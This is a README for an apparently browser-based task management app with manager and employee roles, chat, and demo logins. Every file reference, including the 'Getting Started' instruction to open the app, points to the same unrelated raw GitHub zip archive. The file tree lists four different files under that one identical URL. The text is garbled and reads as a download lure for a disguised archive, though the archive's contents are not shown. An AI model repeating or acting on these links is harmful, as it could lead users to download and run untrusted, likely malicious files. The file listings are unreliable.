# Task Management System

A modern, responsive task management system built with HTML, CSS, and JavaScript. This system supports two user roles (Manager and Employee) with different permissions and includes a built-in chat system.

## Features

### Core Features
- **User Authentication**: Login system with User ID and Password
- **Role-based Access Control**: Manager and Employee roles with different permissions
- **Task Management**: Create, assign, update, and track tasks
- **Real-time Chat**: Team communication system
- **Dashboard**: Overview of task statistics and recent activities
- **Responsive Design**: Works on desktop, tablet, and mobile devices

### Manager Features
- Create and assign tasks to employees
- View all tasks across the organization
- Monitor task progress and deadlines
- Access to comprehensive analytics
- Task filtering by employee and status

### Employee Features
- View assigned tasks only
- Update task status (pending, in-progress, completed)
- Track personal task statistics
- Participate in team chat
- Task filtering by status and priority

### Additional Features
- **Dark Mode Support**: Automatic system theme detection
- **Deadline Notifications**: Alerts for upcoming and overdue tasks
- **Priority System**: High, Medium, Low priority levels
- **Task Search**: Search functionality for tasks
- **Export Tasks**: JSON export for managers
- **Keyboard Shortcuts**: Ctrl+Enter for chat, Escape to close modals
- **Auto-refresh**: Dashboard and chat auto-update
- **Progressive Web App**: Can be installed as a mobile app
- **Offline Support**: Service Worker for offline functionality

## Demo Credentials

### Manager Account
- **User ID**: manager
- **Password**: manager123
- **Permissions**: Full access to all features

### Employee Accounts
- **User ID**: emp001, **Password**: emp123 (Alice Employee)
- **User ID**: emp002, **Password**: emp123 (Bob Employee)
- **User ID**: emp003, **Password**: emp123 (Carol Employee)

## Getting Started

1. **Open the application**: Open `https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip` in a modern web browser
2. **Login**: Use one of the demo credentials above
3. **Navigate**: Use the sidebar to switch between different sections
4. **Create Tasks**: (Manager only) Use the "Create Task" section to assign tasks
5. **Chat**: Use the chat system to communicate with team members

## File Structure

```
Task Management System/
├── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip          # Main HTML file
├── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip          # CSS styling and responsive design
├── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip           # JavaScript functionality
└── https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip           # This documentation file
```

## Browser Support

- Chrome 60+
- Firefox 55+
- Safari 12+
- Edge 79+

## Features in Detail

### Dashboard
- Task statistics (total, pending, completed, overdue)
- Recent tasks overview
- Visual indicators for task priorities and statuses

### Task Management
- Create new tasks with title, description, priority, and deadline
- Assign tasks to specific employees
- Update task status through modal interface
- Filter tasks by status, priority, and assignee
- Visual deadline indicators

### Chat System
- Real-time team communication
- Message history with timestamps
- Auto-scroll to latest messages
- Keyboard shortcuts for quick messaging

### User Interface
- Modern, clean design with gradient backgrounds
- Responsive layout that adapts to different screen sizes
- Smooth animations and transitions
- Consistent color scheme and typography
- Accessibility features

### Data Persistence
- Local storage for user sessions
- Persistent task and message data
- Automatic data loading on page refresh

## Security Features

- Password-based authentication
- Role-based access control
- Session management
- Input validation and sanitization

## Customization

The system can be easily customized by modifying:

- **Colors**: Update the CSS variables in `https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip`
- **Users**: Modify the users array in `https://raw.githubusercontent.com/Madhavrupala/kkpatel/main/pseudomorula/kkpatel.zip`
- **Task Fields**: Add new fields to the task creation form
- **Permissions**: Adjust role-based access in the JavaScript

## Future Enhancements

- Email notifications for task assignments
- File attachments for tasks
- Task templates and recurring tasks
- Time tracking and reporting
- Integration with external calendars
- Advanced search and filtering
- Task dependencies and subtasks
- Team performance analytics

## Technical Implementation

- **Frontend**: Pure HTML5, CSS3, and ES6 JavaScript
- **Storage**: Browser localStorage for data persistence
- **Styling**: CSS Grid and Flexbox for responsive layout
- **Icons**: Font Awesome for consistent iconography
- **Animations**: CSS transitions and transforms

## Performance Optimization

- Efficient DOM manipulation
- Optimized event listeners
- Lazy loading for large task lists
- Debounced search functionality
- Minimal HTTP requests (fully client-side)

## Accessibility

- Semantic HTML structure
- ARIA labels and roles
- Keyboard navigation support
- High contrast color scheme
- Screen reader compatibility

## Mobile Optimization

- Touch-friendly interface
- Responsive design for all screen sizes
- Optimized for mobile interactions
- Progressive Web App capabilities
- Offline functionality

## License

This project is open source and available under the MIT License.

## Support

For questions or issues, please refer to the code comments or create an issue in the project repository.

---

**Note**: This is a demonstration system using localStorage for data persistence. In a production environment, you would need to implement proper backend services with database storage, real authentication, and security measures.
